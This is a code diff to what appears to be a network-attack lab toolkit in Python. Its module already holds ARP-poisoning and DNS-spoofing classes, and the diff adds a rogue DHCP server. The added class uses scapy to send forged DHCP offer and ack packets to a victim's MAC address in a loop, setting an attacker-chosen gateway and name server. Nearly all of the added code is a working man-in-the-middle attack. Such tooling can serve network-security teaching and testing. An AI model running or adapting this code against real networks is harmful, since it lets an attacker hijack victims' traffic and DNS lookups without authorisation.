@@ -5,7 +5,7 @@ from typing import Callable
 import subprocess
 import time
 
-from scapy.all import ARP, DNS, DNSQR, DNSRR, Ether, IP, UDP, send, sendp, sniff
+from scapy.all import ARP, BOOTP, DHCP, DNS, DNSQR, DNSRR, Ether, IP, UDP, send, sendp, sniff
 
 from lab.network import BROADCAST_MAC, interface_mac, resolve_mac
 
@@ -33,6 +33,14 @@ class DnsSpoofEvent:
     client_ip: str
     query_name: str
     answer_ip: str
+
+
+@dataclass(frozen=True)
+class RogueDhcpEvent:
+    message_type: str
+    client_mac: str
+    offered_ip: str
+    server_ip: str
 
 
 class ArpPoisoner:
@@ -294,4 +302,95 @@ class DnsSpoofer:
         finally:
             self.remove_block_rules()
 
+
+class RogueDhcpServer:
+    def __init__(
+        self,
+        interface: str,
+        server_ip: str,
+        offered_ip: str,
+        victim_mac: str,
+        gateway_ip: str,
+        interval: float = 2.0,
+        include_ack: bool = True,
+    ) -> None:
+        self.interface = interface
+        self.server_ip = server_ip
+        self.offered_ip = offered_ip
+        self.victim_mac = victim_mac.lower()
+        self.gateway_ip = gateway_ip
+        self.interval = interval
+        self.include_ack = include_ack
+        self.attacker_mac = interface_mac(interface)
+
+    def _bootp_chaddr(self) -> bytes:
+        raw = bytes.fromhex(self.victim_mac.replace(":", ""))
+        return raw + (b"\x00" * (16 - len(raw)))
+
+    def _dhcp_packet(self, message_type: str):
+        return (
+            Ether(dst=BROADCAST_MAC, src=self.attacker_mac)
+            / IP(src=self.server_ip, dst="255.255.255.255")
+            / UDP(sport=67, dport=68)
+            / BOOTP(
+                op=2,
+                yiaddr=self.offered_ip,
+                siaddr=self.server_ip,
+                giaddr="0.0.0.0",
+                chaddr=self._bootp_chaddr(),
+            )
+            / DHCP(
+                options=[
+                    ("message-type", message_type),
+                    ("server_id", self.server_ip),
+                    ("lease_time", 60),
+                    ("renewal_time", 30),
+                    ("rebinding_time", 45),
+                    ("subnet_mask", "255.255.255.0"),
+                    ("router", self.gateway_ip),
+                    ("name_server", self.server_ip),
+                    "end",
+                ]
+            )
+        )
+
+    def emit_once(self, on_event: Callable[[RogueDhcpEvent], None] | None = None) -> None:
+        offer = self._dhcp_packet("offer")
+        sendp(offer, iface=self.interface, verbose=False)
+        if on_event:
+            on_event(
+                RogueDhcpEvent(
+                    message_type="offer",
+                    client_mac=self.victim_mac,
+                    offered_ip=self.offered_ip,
+                    server_ip=self.server_ip,
+                )
+            )
+
+        if self.include_ack:
+            ack = self._dhcp_packet("ack")
+            sendp(ack, iface=self.interface, verbose=False)
+            if on_event:
+                on_event(
+                    RogueDhcpEvent(
+                        message_type="ack",
+                        client_mac=self.victim_mac,
+                        offered_ip=self.offered_ip,
+                        server_ip=self.server_ip,
+                    )
+                )
+
+    def run(
+        self,
+        cycles: int | None = None,
+        stop_requested: Callable[[], bool] | None = None,
+        on_event: Callable[[RogueDhcpEvent], None] | None = None,
+    ) -> None:
+        sent = 0
+        while cycles is None or sent < cycles:
+            if stop_requested and stop_requested():
+                break
+            self.emit_once(on_event=on_event)
+            sent += 1
+            time.sleep(self.interval)
 
